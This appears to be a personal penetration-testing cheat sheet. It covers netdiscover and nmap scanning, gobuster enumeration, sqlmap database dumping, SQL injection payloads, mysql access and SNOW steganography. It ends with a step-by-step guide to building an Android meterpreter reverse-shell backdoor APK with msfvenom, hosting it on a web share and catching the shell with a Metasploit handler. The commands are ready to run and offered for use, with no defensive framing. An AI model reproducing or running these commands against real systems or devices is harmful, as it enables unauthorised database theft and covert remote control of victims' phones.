## Commands

# Netdiscover
netdiscover -r ip

Ex: netdiscover -r 192.168.1.0/24

In windows:

arp -g

# Sqlmap
1. sqlmap --url 'vulnerable_url"
2. sqlmap --url <url> --databases
3. sqlmap --url <url> --tables
4. sqlmap --url <url> -T <table_name> --columns
5. sqlmap --url <url> --dump -D <database_name> -T <table_name>
    1. Ex: sqlmap --url http://10.10.44.234/about/2 --dump -D site -T people

# Nmap
1. nmap -sV -O -sC -T4 <ip_addr>
2. nmap -A -T4 <ip_addr>

# Snow

## Options Available in SNOW
-C Compress the data if concealing, or uncompress it while extracting.

-Q Quiet mode, If not set means the application will report statistics such as compression percentage and amount of storage available.

-S Report on the approximate amount of space available for a hidden message in the text file. Line length is taken into account, but other options are ignored.

-p For setting the password for concealment of data and while extracting the data.

-l line-len When appending whitespace, snow will always produce lines shorter than this value. By default, it is set to 80.

-f Content of the file will get concealed in the input file.

-m Message String The content written in this flag will be concealed into the input file.

Example
1. Open the uncompressed file.
2. Run the SNOW.exe file.
3. Open CMD and reach the file that you want to hide the message within.
4. Write the command like below for concealing the message into a text file:

**SNOW.EXE -C -p 1234 -m "hidden message" input.txt output.txt**

SNOW.EXE It tells the CMD window that we are using the snow tool for steganography.

-C It is for compressing the data if concealing, or uncompressing it while extracting.

-p It is for a password for concealing and extracting.

input.txt The file in which you want to conceal the message within.

output.txt The file in which you want the output.

# gobuster:
* gobuster dir -u <url> -w <wordlist>   -- enumerates and finds the directories
* x : option to specify file extensions

# SQL Injection:
1.single quote (')
2.payloads: ' OR 1=1;
            ' OR 1=1;#
		  
# Mysql client
1. Command : mysql -u <user> -h <url> -p   -- able to connect mysql running on port 3306
* After connecting to mysql
2.Commands
  1. show databases;
  2. use <database_name>;  -- the dtabase you wanna check
  3. select * from <tablename>;

# Hack an Android Device by Creating Binary Payloads using Parrot Security

Parrot OS:
1. We can achieve this using metaspolit
2. First start the postgresql server
    1. Command: service postgresql start
3. create a payload 
   1. Command: msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=IP.ADDR R > Desktop/Backdoor.apk
4. We are sharing the backdoor.apk using share folder
    #### Commands:
     1. mkdir /var/www/html/share
     2. chmod -R 755 /var/www/html/share
     3. chown -R www-data:www-data /var/www/html/share
5. Start the apache2
     1. Cmd: service apache2 start
6. Copy the backdoor.apk file to share folder
     1. cp /.../.../backdoor.apk /var/www/html/share

7. Launch the metaspolit using command msfconsole
8. Use the module exploit/multi/handler  (use exploit/multi/handler)
9. Set the payload and LHOST
     1. set payload android/meterpreter/reverse_tcp 
	   2. set LHOST ip_addr (// The LHOST is the IP address of the attacking computer )
	   3. show options (// we can see what are the options set)
10. Run the exploit
    1. exploit -j -z (// the command runs the exploit as background job)
